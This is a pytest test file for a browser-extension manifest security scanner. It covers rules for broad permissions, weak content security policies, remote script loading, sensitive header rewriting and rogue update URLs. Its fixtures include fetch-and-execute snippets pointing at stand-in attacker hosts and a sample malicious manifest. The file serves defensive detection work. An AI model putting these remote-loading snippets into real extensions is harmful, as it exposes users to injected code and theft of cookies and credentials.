"""Tests for ``scripts/lib/browser_extension_patterns.py``.

Wave 18 impl-J — verifies the 16-proposal distillation in
``reports/distill-round-4/browser-extension-manifest.md`` is covered by
positive + negative tests for every rule, plus composite scanners
(sandbox-iframe-injection, rogue-update-URL host allowlist). Pure-stdlib
pytest; no third-party fixtures. Mirrors the conventions used by
``tests/test_frontend_patterns.py`` and
``tests/test_auth_flow_patterns.py``.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT / "scripts" / "lib"))

import browser_extension_patterns as bp  # noqa: E402

# ---- Helper -------------------------------------------------------------


def _hits(rule_id: str, text: str) -> list[bp.Finding]:
    """Return only findings of ``rule_id`` from ``scan_text(text)``."""
    return [f for f in bp.scan_text(text) if f.rule_id == rule_id]


# ---- Module-level invariants -------------------------------------------


def test_rules_have_unique_ids() -> None:
    """Every Rule.id is unique — duplicates would dedupe-collide."""
    ids = [r.id for r in bp.RULES]
    assert len(ids) == len(set(ids)), f"duplicate rule ids: {ids}"


def test_rules_have_compiled_patterns() -> None:
    """Every Rule.pattern is a compiled regex with MULTILINE+UNICODE."""
    for rule in bp.RULES:
        assert isinstance(rule.pattern, re.Pattern), rule.id
        assert rule.pattern.flags & re.MULTILINE, rule.id
        assert rule.pattern.flags & re.UNICODE, rule.id


def test_rules_have_valid_severity() -> None:
    """Severity is one of the four canonical strings."""
    allowed = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}
    for rule in bp.RULES:
        assert rule.severity in allowed, f"{rule.id}: {rule.severity}"


def test_rules_have_owasp_mapping() -> None:
    """Every rule maps to an OWASP-ASI identifier."""
    for rule in bp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id


def test_scan_empty_returns_empty() -> None:
    """Empty input returns empty findings list."""
    assert bp.scan_text("") == []
    assert bp.scan_text("\n\n") == []


def test_rules_count_covers_all_proposals() -> None:
    """Wave-18 distill-J shipped 16 proposals; the module expands them
    into ≥ 16 atomic rules (some proposals split into permission +
    source-code arms, plus reverse-order variants)."""
    assert len(bp.RULES) >= 16


def test_finding_namedtuple_shape() -> None:
    """Finding has the same 7 fields as frontend_patterns.Finding."""
    f = bp.Finding(
        rule_id="x", line=1, column=1, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-05",
    )
    assert f.rule_id == "x"
    assert f.line == 1
    assert f.column == 1
    assert f.severity == "HIGH"


def test_dangerous_perms_policy_set_non_empty() -> None:
    """DANGEROUS_EXT_PERMS frozenset is exported and contains the
    canonical set."""
    assert isinstance(bp.DANGEROUS_EXT_PERMS, frozenset)
    assert "webRequestBlocking" in bp.DANGEROUS_EXT_PERMS
    assert "nativeMessaging" in bp.DANGEROUS_EXT_PERMS
    assert "cookies" in bp.DANGEROUS_EXT_PERMS
    # Sanity floor on coverage.
    assert len(bp.DANGEROUS_EXT_PERMS) >= 10


def test_legit_update_hosts_set_includes_all_stores() -> None:
    """LEGIT_UPDATE_HOSTS covers the major browser extension stores."""
    assert "clients2.google.com" in bp.LEGIT_UPDATE_HOSTS
    assert "addons.mozilla.org" in bp.LEGIT_UPDATE_HOSTS
    assert "edge.microsoft.com" in bp.LEGIT_UPDATE_HOSTS
    assert "addons.opera.com" in bp.LEGIT_UPDATE_HOSTS


def test_legit_search_hosts_set_non_empty() -> None:
    """LEGIT_SEARCH_HOSTS covers mainline search engines."""
    assert "google.com" in bp.LEGIT_SEARCH_HOSTS
    assert "duckduckgo.com" in bp.LEGIT_SEARCH_HOSTS
    assert "brave.com" in bp.LEGIT_SEARCH_HOSTS


# ---- Rule: ext-host-permissions-all-urls -------------------------------


def test_host_permissions_all_urls_positive() -> None:
    """host_permissions: ["<all_urls>"] is flagged."""
    src = """{
        "manifest_version": 3,
        "host_permissions": ["<all_urls>"],
        "permissions": ["scripting"]
    }"""
    assert _hits("ext-host-permissions-all-urls", src)


def test_host_permissions_all_urls_with_other_entries_positive() -> None:
    """host_permissions: ["https://api.example/*", "<all_urls>"] is flagged."""
    src = '{"host_permissions": ["https://api.example/*", "<all_urls>"]}'
    assert _hits("ext-host-permissions-all-urls", src)


def test_host_permissions_specific_hosts_negative() -> None:
    """host_permissions with specific hosts only is NOT flagged."""
    src = '{"host_permissions": ["https://api.example.com/*"]}'
    assert not _hits("ext-host-permissions-all-urls", src)


def test_host_permissions_empty_negative() -> None:
    """Empty host_permissions array is NOT flagged."""
    src = '{"host_permissions": []}'
    assert not _hits("ext-host-permissions-all-urls", src)


# ---- Rule: ext-host-permissions-wildcard -------------------------------


def test_host_permissions_https_wildcard_positive() -> None:
    """host_permissions: ["https://*/*"] is flagged as wildcarded."""
    src = '{"host_permissions": ["https://*/*"]}'
    assert _hits("ext-host-permissions-wildcard", src)


def test_host_permissions_protocol_wildcard_positive() -> None:
    """host_permissions: ["*://*/*"] is flagged as wildcarded."""
    src = '{"host_permissions": ["*://*/*"]}'
    assert _hits("ext-host-permissions-wildcard", src)


def test_host_permissions_specific_origin_negative() -> None:
    """host_permissions with subdomain wildcard but specific TLD is
    NOT flagged by the strict wildcard rule (still review-worthy via
    other rules, but not the universal-host variant)."""
    src = '{"host_permissions": ["https://*.example.com/*"]}'
    assert not _hits("ext-host-permissions-wildcard", src)


# ---- Rule: ext-mv2-permissions-all-urls --------------------------------


def test_mv2_permissions_all_urls_positive() -> None:
    """Legacy MV2 permissions: ["<all_urls>"] is flagged."""
    src = """{
        "manifest_version": 2,
        "permissions": ["<all_urls>", "storage"]
    }"""
    assert _hits("ext-mv2-permissions-all-urls", src)


def test_mv2_permissions_api_only_negative() -> None:
    """MV2 permissions with no host patterns is NOT flagged."""
    src = '{"manifest_version": 2, "permissions": ["storage", "alarms"]}'
    assert not _hits("ext-mv2-permissions-all-urls", src)


# ---- Rule: ext-content-script-broad-early-injection --------------------


def test_content_script_broad_early_positive() -> None:
    """content_scripts with <all_urls> + document_start is flagged."""
    src = """{
        "content_scripts": [{
            "matches": ["<all_urls>"],
            "run_at": "document_start",
            "js": ["content.js"]
        }]
    }"""
    assert _hits("ext-content-script-broad-early-injection", src)


def test_content_script_broad_early_with_all_frames_positive() -> None:
    """Same pattern with all_frames: true triggers the rule."""
    src = """{
        "content_scripts": [{
            "matches": ["<all_urls>"],
            "run_at": "document_start",
            "all_frames": true,
            "js": ["content.js"]
        }]
    }"""
    assert _hits("ext-content-script-broad-early-injection", src)


def test_content_script_specific_match_negative() -> None:
    """Specific-host content script + document_start is NOT flagged."""
    src = """{
        "content_scripts": [{
            "matches": ["https://example.com/*"],
            "run_at": "document_start"
        }]
    }"""
    assert not _hits("ext-content-script-broad-early-injection", src)


def test_content_script_document_idle_negative() -> None:
    """<all_urls> match + document_idle run_at is NOT flagged (the
    early-injection vector requires document_start)."""
    src = """{
        "content_scripts": [{
            "matches": ["<all_urls>"],
            "run_at": "document_idle"
        }]
    }"""
    assert not _hits("ext-content-script-broad-early-injection", src)


# ---- Rule: ext-content-script-broad-early-injection-rev ----------------


def test_content_script_broad_early_reverse_order_positive() -> None:
    """run_at before matches is flagged by the reverse-order rule."""
    src = """{
        "content_scripts": [{
            "run_at": "document_start",
            "js": ["content.js"],
            "matches": ["<all_urls>"]
        }]
    }"""
    assert _hits("ext-content-script-broad-early-injection-rev", src)


# ---- Rule: ext-externally-connectable-wildcard -------------------------


def test_externally_connectable_all_urls_positive() -> None:
    """externally_connectable.matches: ["<all_urls>"] is flagged."""
    src = '{"externally_connectable": {"matches": ["<all_urls>"]}}'
    assert _hits("ext-externally-connectable-wildcard", src)


def test_externally_connectable_https_wildcard_positive() -> None:
    """externally_connectable.matches: ["https://*/*"] is flagged."""
    src = '{"externally_connectable": {"matches": ["https://*/*"]}}'
    assert _hits("ext-externally-connectable-wildcard", src)


def test_externally_connectable_specific_negative() -> None:
    """A specific-host externally_connectable is NOT flagged."""
    src = '{"externally_connectable": {"matches": ["https://trusted.example/*"]}}'
    assert not _hits("ext-externally-connectable-wildcard", src)


# ---- Rule: ext-csp-unsafe-eval -----------------------------------------


def test_ext_csp_unsafe_eval_mv3_positive() -> None:
    """MV3 object form with unsafe-eval is flagged."""
    src = """{
        "content_security_policy": {
            "extension_pages": "script-src 'self' 'unsafe-eval'; object-src 'self';"
        }
    }"""
    assert _hits("ext-csp-unsafe-eval", src)


def test_ext_csp_unsafe_inline_mv2_positive() -> None:
    """MV2 string form with unsafe-inline is flagged."""
    src = (
        '{"content_security_policy": '
        '"script-src \'self\' \'unsafe-inline\'; object-src \'self\';"}'
    )
    assert _hits("ext-csp-unsafe-eval", src)


def test_ext_csp_strict_default_negative() -> None:
    """MV3 strict default ("script-src 'self'") is NOT flagged."""
    src = """{
        "content_security_policy": {
            "extension_pages": "script-src 'self'; object-src 'self';"
        }
    }"""
    assert not _hits("ext-csp-unsafe-eval", src)


# ---- Rule: ext-csp-remote-script-src ----------------------------------


def test_ext_csp_remote_host_positive() -> None:
    """Remote https:// host in script-src is flagged."""
    src = """{
        "content_security_policy": {
            "extension_pages": "script-src 'self' https://evil.cdn/; object-src 'self';"
        }
    }"""
    assert _hits("ext-csp-remote-script-src", src)


def test_ext_csp_wildcard_subdomain_positive() -> None:
    """*.cdn.tld wildcard subdomain in script-src is flagged."""
    src = (
        '{"content_security_policy": '
        '"script-src \'self\' *.cdn.example; object-src \'self\';"}'
    )
    assert _hits("ext-csp-remote-script-src", src)


def test_ext_csp_self_only_negative() -> None:
    """script-src 'self' with no remote host is NOT flagged."""
    src = (
        '{"content_security_policy": '
        '"script-src \'self\'; object-src \'self\';"}'
    )
    assert not _hits("ext-csp-remote-script-src", src)


# ---- Rule: ext-sw-remote-import-scripts --------------------------------


def test_sw_remote_import_scripts_positive() -> None:
    """importScripts("https://cdn/...") is flagged."""
    src = 'importScripts("https://attacker.cdn/loader.js");'
    assert _hits("ext-sw-remote-import-scripts", src)


def test_sw_remote_import_scripts_single_quote_positive() -> None:
    """importScripts('https://...') (single quotes) is flagged."""
    src = "importScripts('https://attacker.cdn/loader.js');"
    assert _hits("ext-sw-remote-import-scripts", src)


def test_sw_local_import_scripts_negative() -> None:
    """importScripts('local.js') is NOT flagged."""
    src = 'importScripts("local.js");'
    assert not _hits("ext-sw-remote-import-scripts", src)


def test_sw_localhost_import_scripts_negative() -> None:
    """importScripts('http://localhost/...') is NOT flagged (dev fixture)."""
    src = 'importScripts("http://localhost:8080/dev.js");'
    assert not _hits("ext-sw-remote-import-scripts", src)


# ---- Rule: ext-sw-remote-dynamic-import --------------------------------


def test_sw_remote_dynamic_import_positive() -> None:
    """Dynamic import("https://...") is flagged."""
    src = 'await import("https://attacker.cdn/loader.js");'
    assert _hits("ext-sw-remote-dynamic-import", src)


def test_sw_localhost_dynamic_import_negative() -> None:
    """Dynamic import("http://localhost/...") is NOT flagged."""
    src = 'await import("http://127.0.0.1:8080/dev.js");'
    assert not _hits("ext-sw-remote-dynamic-import", src)


# ---- Rule: ext-sw-fetch-then-eval --------------------------------------


def test_sw_fetch_then_eval_positive() -> None:
    """fetch(url).then(r => r.text()).then(eval) is flagged."""
    src = (
        'fetch("https://attacker.cdn/p.js")'
        '.then(r => r.text()).then(eval);'
    )
    assert _hits("ext-sw-fetch-then-eval", src)


def test_sw_fetch_then_json_negative() -> None:
    """fetch(url).then(r => r.json()) without eval is NOT flagged."""
    src = 'fetch("https://api.example/data").then(r => r.json());'
    assert not _hits("ext-sw-fetch-then-eval", src)


# ---- Rule: ext-dnr-header-target-sensitive -----------------------------


def test_dnr_header_authorization_positive() -> None:
    """modifyHeaders targeting Authorization is flagged."""
    src = '{"header": "Authorization", "operation": "set", "value": "..."}'
    assert _hits("ext-dnr-header-target-sensitive", src)


def test_dnr_header_cookie_positive() -> None:
    """modifyHeaders targeting Cookie is flagged."""
    src = '{"header": "Cookie", "operation": "set"}'
    assert _hits("ext-dnr-header-target-sensitive", src)


def test_dnr_header_case_insensitive_positive() -> None:
    """Case-insensitive match: "authorization" (lowercase) still flags."""
    src = '{"header": "authorization", "operation": "set"}'
    assert _hits("ext-dnr-header-target-sensitive", src)


def test_dnr_header_x_api_key_positive() -> None:
    """modifyHeaders targeting X-Api-Key is flagged."""
    src = '{"header": "X-Api-Key", "operation": "set"}'
    assert _hits("ext-dnr-header-target-sensitive", src)


def test_dnr_header_content_type_negative() -> None:
    """Innocuous header (Content-Type) is NOT flagged."""
    src = '{"header": "Content-Type", "operation": "set"}'
    assert not _hits("ext-dnr-header-target-sensitive", src)


# ---- Rule: ext-dnr-dynamic-rules-call ----------------------------------


def test_dnr_update_dynamic_rules_positive() -> None:
    """chrome.declarativeNetRequest.updateDynamicRules(...) is flagged."""
    src = "chrome.declarativeNetRequest.updateDynamicRules({addRules: rules});"
    assert _hits("ext-dnr-dynamic-rules-call", src)


def test_dnr_update_session_rules_positive() -> None:
    """chrome.declarativeNetRequest.updateSessionRules(...) is flagged."""
    src = "chrome.declarativeNetRequest.updateSessionRules({addRules: r});"
    assert _hits("ext-dnr-dynamic-rules-call", src)


def test_dnr_get_dynamic_rules_negative() -> None:
    """Read-only getDynamicRules is NOT flagged."""
    src = "const rules = await chrome.declarativeNetRequest.getDynamicRules();"
    assert not _hits("ext-dnr-dynamic-rules-call", src)


# ---- Rule: ext-dangerous-permission ------------------------------------


def test_dangerous_permission_cookies_positive() -> None:
    """A single "cookies" permission token is flagged."""
    src = '{"permissions": ["storage", "cookies", "alarms"]}'
    assert _hits("ext-dangerous-permission", src)


def test_dangerous_permission_native_messaging_positive() -> None:
    """nativeMessaging permission token is flagged."""
    src = '{"permissions": ["nativeMessaging"]}'
    assert _hits("ext-dangerous-permission", src)


def test_dangerous_permission_proxy_positive() -> None:
    """proxy permission token is flagged."""
    src = '{"permissions": ["proxy", "storage"]}'
    assert _hits("ext-dangerous-permission", src)


def test_dangerous_permission_storage_only_negative() -> None:
    """Innocuous permissions (storage, alarms) are NOT flagged."""
    src = '{"permissions": ["storage", "alarms", "notifications"]}'
    assert not _hits("ext-dangerous-permission", src)


# ---- Rule: ext-optional-permissions-dangerous --------------------------


def test_optional_permissions_all_urls_positive() -> None:
    """optional_permissions: ["<all_urls>"] is flagged."""
    src = '{"optional_permissions": ["<all_urls>"]}'
    assert _hits("ext-optional-permissions-dangerous", src)


def test_optional_permissions_native_messaging_positive() -> None:
    """optional_permissions: ["nativeMessaging"] is flagged."""
    src = '{"optional_permissions": ["nativeMessaging", "storage"]}'
    assert _hits("ext-optional-permissions-dangerous", src)


def test_optional_permissions_storage_only_negative() -> None:
    """optional_permissions: ["storage"] alone is NOT flagged."""
    src = '{"optional_permissions": ["storage"]}'
    assert not _hits("ext-optional-permissions-dangerous", src)


# ---- Rule: ext-chrome-permissions-request-call -------------------------


def test_chrome_permissions_request_positive() -> None:
    """chrome.permissions.request(...) is flagged."""
    src = "chrome.permissions.request({permissions: ['debugger']});"
    assert _hits("ext-chrome-permissions-request-call", src)


def test_chrome_permissions_contains_negative() -> None:
    """chrome.permissions.contains (read-only) is NOT flagged."""
    src = "chrome.permissions.contains({permissions: ['debugger']});"
    assert not _hits("ext-chrome-permissions-request-call", src)


# ---- Rule: ext-runtime-on-message-external -----------------------------


def test_runtime_on_message_external_positive() -> None:
    """chrome.runtime.onMessageExternal.addListener is flagged."""
    src = "chrome.runtime.onMessageExternal.addListener(handler);"
    assert _hits("ext-runtime-on-message-external", src)


def test_runtime_on_message_internal_negative() -> None:
    """Plain chrome.runtime.onMessage (intra-extension) is NOT flagged."""
    src = "chrome.runtime.onMessage.addListener(handler);"
    assert not _hits("ext-runtime-on-message-external", src)


# ---- Rule: ext-war-mv2-wildcard ----------------------------------------


def test_war_mv2_wildcard_positive() -> None:
    """MV2 web_accessible_resources: ["*"] is flagged."""
    src = '{"web_accessible_resources": ["*"]}'
    assert _hits("ext-war-mv2-wildcard", src)


def test_war_mv2_mixed_wildcard_positive() -> None:
    """MV2 WAR with ["*", "popup.html"] is flagged."""
    src = '{"web_accessible_resources": ["popup.html", "*"]}'
    assert _hits("ext-war-mv2-wildcard", src)


def test_war_mv2_specific_only_negative() -> None:
    """MV2 WAR with specific paths only is NOT flagged."""
    src = '{"web_accessible_resources": ["popup.html", "icon.png"]}'
    assert not _hits("ext-war-mv2-wildcard", src)


# ---- Rule: ext-war-mv3-broad -------------------------------------------


def test_war_mv3_broad_positive() -> None:
    """MV3 WAR with resources: ["*"] + matches: ["<all_urls>"] is flagged."""
    src = """{
        "web_accessible_resources": [{
            "resources": ["*"],
            "matches": ["<all_urls>"]
        }]
    }"""
    assert _hits("ext-war-mv3-broad", src)


def test_war_mv3_broad_reverse_positive() -> None:
    """MV3 WAR with matches before resources is flagged by the rev rule."""
    src = """{
        "web_accessible_resources": [{
            "matches": ["<all_urls>"],
            "resources": ["*"]
        }]
    }"""
    assert _hits("ext-war-mv3-broad-rev", src)


def test_war_mv3_specific_matches_negative() -> None:
    """MV3 WAR with specific matches is NOT flagged."""
    src = """{
        "web_accessible_resources": [{
            "resources": ["*"],
            "matches": ["https://trusted.example/*"]
        }]
    }"""
    assert not _hits("ext-war-mv3-broad", src)
    assert not _hits("ext-war-mv3-broad-rev", src)


# ---- Rule: ext-native-messaging-permission -----------------------------


def test_native_messaging_permission_positive() -> None:
    """A permissions array containing "nativeMessaging" is flagged."""
    src = '{"permissions": ["nativeMessaging"]}'
    assert _hits("ext-native-messaging-permission", src)


def test_native_messaging_permission_absent_negative() -> None:
    """A permissions array without "nativeMessaging" is NOT flagged."""
    src = '{"permissions": ["storage", "tabs"]}'
    assert not _hits("ext-native-messaging-permission", src)


# ---- Rule: ext-native-host-path-suspicious -----------------------------


def test_native_host_path_tmp_positive() -> None:
    """NMH manifest path under /tmp/ is flagged."""
    src = """{
        "name": "com.x",
        "path": "/tmp/.cache/payload.bin",
        "type": "stdio"
    }"""
    assert _hits("ext-native-host-path-suspicious", src)


def test_native_host_path_user_cache_positive() -> None:
    """NMH manifest path under /home/user/.cache/ is flagged."""
    src = '{"path": "/home/alice/.cache/loader"}'
    assert _hits("ext-native-host-path-suspicious", src)


def test_native_host_path_macos_downloads_positive() -> None:
    """NMH manifest path under /Users/<name>/Downloads/ is flagged."""
    src = '{"path": "/Users/alice/Downloads/host.bin"}'
    assert _hits("ext-native-host-path-suspicious", src)


def test_native_host_path_var_tmp_positive() -> None:
    """NMH manifest path under /var/tmp/ is flagged."""
    src = '{"path": "/var/tmp/host.bin"}'
    assert _hits("ext-native-host-path-suspicious", src)


def test_native_host_path_usr_bin_negative() -> None:
    """NMH manifest path under /usr/local/bin/ (vetted) is NOT flagged."""
    src = '{"path": "/usr/local/bin/com.legit.host"}'
    assert not _hits("ext-native-host-path-suspicious", src)


def test_native_host_path_opt_negative() -> None:
    """NMH manifest path under /opt/ (vetted) is NOT flagged."""
    src = '{"path": "/opt/legit-extension/host"}'
    assert not _hits("ext-native-host-path-suspicious", src)


# ---- Rule: ext-dnr-permission ------------------------------------------


def test_dnr_permission_positive() -> None:
    """permissions: ["declarativeNetRequest"] is flagged."""
    src = '{"permissions": ["declarativeNetRequest"]}'
    assert _hits("ext-dnr-permission", src)


def test_dnr_permission_with_host_access_positive() -> None:
    """permissions: ["declarativeNetRequestWithHostAccess"] is flagged."""
    src = '{"permissions": ["declarativeNetRequestWithHostAccess"]}'
    assert _hits("ext-dnr-permission", src)


def test_dnr_permission_absent_negative() -> None:
    """A permissions array without DNR is NOT flagged."""
    src = '{"permissions": ["storage"]}'
    assert not _hits("ext-dnr-permission", src)


# ---- Rule: ext-content-script-main-world -------------------------------


def test_content_script_main_world_positive() -> None:
    """content_scripts entry with world: "MAIN" is flagged."""
    src = """{
        "content_scripts": [{
            "matches": ["https://*.bank.example/*"],
            "js": ["inject.js"],
            "world": "MAIN"
        }]
    }"""
    assert _hits("ext-content-script-main-world", src)


def test_content_script_isolated_world_negative() -> None:
    """content_scripts with world: "ISOLATED" is NOT flagged."""
    src = """{
        "content_scripts": [{
            "matches": ["https://*.example/*"],
            "js": ["isolated.js"],
            "world": "ISOLATED"
        }]
    }"""
    assert not _hits("ext-content-script-main-world", src)


def test_content_script_no_world_negative() -> None:
    """content_scripts without world key (default isolated) is NOT flagged."""
    src = """{
        "content_scripts": [{
            "matches": ["https://*.example/*"],
            "js": ["default.js"]
        }]
    }"""
    assert not _hits("ext-content-script-main-world", src)


# ---- Rule: ext-omnibox-keyword -----------------------------------------


def test_omnibox_keyword_positive() -> None:
    """omnibox: { keyword: "..." } is flagged."""
    src = '{"omnibox": {"keyword": "qq"}}'
    assert _hits("ext-omnibox-keyword", src)


def test_omnibox_absent_negative() -> None:
    """No omnibox key → not flagged."""
    src = '{"manifest_version": 3}'
    assert not _hits("ext-omnibox-keyword", src)


# ---- Rule: ext-chrome-url-overrides ------------------------------------


def test_chrome_url_overrides_newtab_positive() -> None:
    """chrome_url_overrides.newtab is flagged."""
    src = '{"chrome_url_overrides": {"newtab": "newtab.html"}}'
    assert _hits("ext-chrome-url-overrides", src)


def test_chrome_url_overrides_history_positive() -> None:
    """chrome_url_overrides.history is flagged."""
    src = '{"chrome_url_overrides": {"history": "history.html"}}'
    assert _hits("ext-chrome-url-overrides", src)


def test_chrome_url_overrides_bookmarks_positive() -> None:
    """chrome_url_overrides.bookmarks is flagged."""
    src = '{"chrome_url_overrides": {"bookmarks": "bookmarks.html"}}'
    assert _hits("ext-chrome-url-overrides", src)


def test_chrome_url_overrides_absent_negative() -> None:
    """A manifest without chrome_url_overrides is NOT flagged."""
    src = '{"manifest_version": 3, "name": "x"}'
    assert not _hits("ext-chrome-url-overrides", src)


# ---- Rule: ext-search-provider-override --------------------------------


def test_search_provider_override_positive() -> None:
    """chrome_settings_overrides.search_provider is flagged."""
    src = """{
        "chrome_settings_overrides": {
            "search_provider": {
                "name": "Better Search",
                "keyword": "bsrch",
                "search_url": "https://search-affiliate.example/?q={searchTerms}",
                "is_default": true
            }
        }
    }"""
    assert _hits("ext-search-provider-override", src)


def test_search_provider_override_absent_negative() -> None:
    """No chrome_settings_overrides → not flagged."""
    src = '{"manifest_version": 3}'
    assert not _hits("ext-search-provider-override", src)


# ---- Rule: ext-search-provider-affiliate -------------------------------


def test_search_provider_affiliate_aff_positive() -> None:
    """search_url with ?aff= parameter is flagged."""
    src = '"search_url": "https://x.example/?q={searchTerms}&aff=ABC123"'
    assert _hits("ext-search-provider-affiliate", src)


def test_search_provider_affiliate_partner_positive() -> None:
    """search_url with ?partner= parameter is flagged."""
    src = '"search_url": "https://x.example/?partner=evil&q={searchTerms}"'
    assert _hits("ext-search-provider-affiliate", src)


def test_search_provider_affiliate_no_params_negative() -> None:
    """Clean search_url without affiliate params is NOT flagged."""
    src = '"search_url": "https://google.com/search?q={searchTerms}"'
    assert not _hits("ext-search-provider-affiliate", src)


# ---- Rule: ext-incognito-spanning --------------------------------------


def test_incognito_spanning_positive() -> None:
    """incognito: "spanning" is flagged."""
    src = '{"incognito": "spanning"}'
    assert _hits("ext-incognito-spanning", src)


def test_incognito_split_negative() -> None:
    """incognito: "split" (safe per-profile) is NOT flagged."""
    src = '{"incognito": "split"}'
    assert not _hits("ext-incognito-spanning", src)


def test_incognito_not_allowed_negative() -> None:
    """incognito: "not_allowed" (disabled in incognito) is NOT flagged."""
    src = '{"incognito": "not_allowed"}'
    assert not _hits("ext-incognito-spanning", src)


# ---- Composite scanner: scan_sandbox_iframe_injection ------------------


def test_sandbox_iframe_universal_embed_positive() -> None:
    """sandbox.pages with WAR overlap and no frame-ancestors → universal-embed."""
    manifest = """{
        "sandbox": {
            "pages": ["sandbox.html"],
            "content_security_policy": "sandbox allow-scripts"
        },
        "web_accessible_resources": [{
            "resources": ["sandbox.html"],
            "matches": ["<all_urls>"]
        }]
    }"""
    markers = bp.scan_sandbox_iframe_injection(manifest)
    assert "sandbox-iframe-universal-embed" in markers


def test_sandbox_iframe_permissive_ancestors_positive() -> None:
    """sandbox.pages with WAR overlap + permissive frame-ancestors → permissive."""
    manifest = """{
        "sandbox": {
            "pages": ["sandbox.html"],
            "content_security_policy": "sandbox allow-scripts; frame-ancestors *"
        },
        "web_accessible_resources": [{
            "resources": ["sandbox.html"],
            "matches": ["<all_urls>"]
        }]
    }"""
    markers = bp.scan_sandbox_iframe_injection(manifest)
    assert "sandbox-iframe-permissive-ancestors" in markers


def test_sandbox_iframe_with_unsafe_eval_positive() -> None:
    """Sandbox CSP with unsafe-eval + WAR overlap → with-unsafe-eval marker."""
    manifest = """{
        "sandbox": {
            "pages": ["sandbox.html"],
            "content_security_policy": "sandbox allow-scripts; script-src 'self' 'unsafe-eval'"
        },
        "web_accessible_resources": [{
            "resources": ["sandbox.html"],
            "matches": ["<all_urls>"]
        }]
    }"""
    markers = bp.scan_sandbox_iframe_injection(manifest)
    assert "sandbox-iframe-with-unsafe-eval" in markers


def test_sandbox_iframe_frame_ancestors_self_negative() -> None:
    """frame-ancestors 'self' is safe → no markers."""
    manifest = """{
        "sandbox": {
            "pages": ["sandbox.html"],
            "content_security_policy": "sandbox allow-scripts; frame-ancestors 'self'"
        },
        "web_accessible_resources": [{
            "resources": ["sandbox.html"],
            "matches": ["<all_urls>"]
        }]
    }"""
    markers = bp.scan_sandbox_iframe_injection(manifest)
    assert "sandbox-iframe-universal-embed" not in markers
    assert "sandbox-iframe-permissive-ancestors" not in markers


def test_sandbox_iframe_no_war_overlap_negative() -> None:
    """sandbox.pages but WAR points to OTHER files → no markers."""
    manifest = """{
        "sandbox": {
            "pages": ["sandbox.html"]
        },
        "web_accessible_resources": [{
            "resources": ["popup.html"],
            "matches": ["<all_urls>"]
        }]
    }"""
    markers = bp.scan_sandbox_iframe_injection(manifest)
    assert markers == []


def test_sandbox_iframe_no_sandbox_negative() -> None:
    """No sandbox key → empty marker list."""
    manifest = '{"manifest_version": 3, "name": "x"}'
    assert bp.scan_sandbox_iframe_injection(manifest) == []


def test_sandbox_iframe_empty_input_negative() -> None:
    """Empty input → empty marker list."""
    assert bp.scan_sandbox_iframe_injection("") == []


# ---- Composite scanner: scan_rogue_update_urls -------------------------


def test_rogue_update_url_attacker_host_positive() -> None:
    """update_url pointing at attacker host is flagged."""
    src = '{"update_url": "https://attacker.example/updates.xml"}'
    findings = bp.scan_rogue_update_urls(src)
    assert any(
        f.rule_id == "ext-rogue-update-url"
        and "attacker.example" in f.description
        for f in findings
    )


def test_rogue_update_url_subdomain_spoof_positive() -> None:
    """clients2.google.com.attacker.tld is correctly flagged (strict equality)."""
    src = (
        '{"update_url": "https://clients2.google.com.attacker.tld/u"}'
    )
    findings = bp.scan_rogue_update_urls(src)
    # Strict-match enforcement: spoofed host fails the allowlist.
    assert any(f.rule_id == "ext-rogue-update-url" for f in findings)


def test_rogue_update_url_chrome_web_store_negative() -> None:
    """clients2.google.com (legit Chrome Web Store) is NOT flagged."""
    src = (
        '{"update_url": "https://clients2.google.com/service/update2/crx"}'
    )
    findings = bp.scan_rogue_update_urls(src)
    assert findings == []


def test_rogue_update_url_addons_mozilla_negative() -> None:
    """addons.mozilla.org is NOT flagged."""
    src = '{"update_url": "https://addons.mozilla.org/api/v5/x"}'
    findings = bp.scan_rogue_update_urls(src)
    assert findings == []


def test_rogue_update_url_empty_input_negative() -> None:
    """Empty input → empty findings list."""
    assert bp.scan_rogue_update_urls("") == []


def test_rogue_update_url_no_update_url_negative() -> None:
    """No update_url field → empty findings list."""
    src = '{"manifest_version": 3, "name": "x"}'
    assert bp.scan_rogue_update_urls(src) == []


# ---- Integration: full malicious manifest -------------------------------


def test_full_malicious_manifest_fires_many_rules() -> None:
    """A manifest combining several malicious patterns surfaces a
    cluster of findings — Cyberhaven Dec-2024-style three-strike
    (MAIN world + document_start + <all_urls>) plus dangerous perms
    plus rogue update URL."""
    manifest = """{
        "manifest_version": 3,
        "name": "Evil Helper",
        "version": "1.0",
        "host_permissions": ["<all_urls>"],
        "permissions": ["cookies", "webRequest", "nativeMessaging"],
        "content_scripts": [{
            "matches": ["<all_urls>"],
            "run_at": "document_start",
            "world": "MAIN",
            "js": ["inject.js"]
        }],
        "content_security_policy": {
            "extension_pages": "script-src 'self' 'unsafe-eval' https://evil.cdn/; object-src 'self';"
        },
        "update_url": "https://evil.example/updates.xml"
    }"""
    findings = bp.scan_text(manifest)
    rule_ids = {f.rule_id for f in findings}
    # Each individual pattern should fire.
    assert "ext-host-permissions-all-urls" in rule_ids
    assert "ext-content-script-broad-early-injection" in rule_ids
    assert "ext-content-script-main-world" in rule_ids
    assert "ext-csp-unsafe-eval" in rule_ids
    assert "ext-csp-remote-script-src" in rule_ids
    assert "ext-dangerous-permission" in rule_ids
    assert "ext-native-messaging-permission" in rule_ids
    # Rogue update URL is via the composite scanner.
    rogue = bp.scan_rogue_update_urls(manifest)
    assert any(f.rule_id == "ext-rogue-update-url" for f in rogue)


def test_clean_manifest_no_findings() -> None:
    """A minimal clean manifest produces zero findings."""
    manifest = """{
        "manifest_version": 3,
        "name": "Clean Extension",
        "version": "1.0",
        "permissions": ["storage"],
        "host_permissions": ["https://api.example.com/*"],
        "action": {"default_popup": "popup.html"},
        "background": {"service_worker": "background.js"}
    }"""
    findings = bp.scan_text(manifest)
    assert findings == []
    assert bp.scan_rogue_update_urls(manifest) == []
    assert bp.scan_sandbox_iframe_injection(manifest) == []


def test_findings_are_sorted_by_line_column() -> None:
    """scan_text returns findings sorted by (line, column, rule_id)."""
    manifest = (
        '{\n'
        '  "host_permissions": ["<all_urls>"],\n'
        '  "permissions": ["cookies"],\n'
        '  "incognito": "spanning"\n'
        '}\n'
    )
    findings = bp.scan_text(manifest)
    for prev, curr in zip(findings, findings[1:], strict=False):
        assert (prev.line, prev.column, prev.rule_id) <= (
            curr.line, curr.column, curr.rule_id
        )


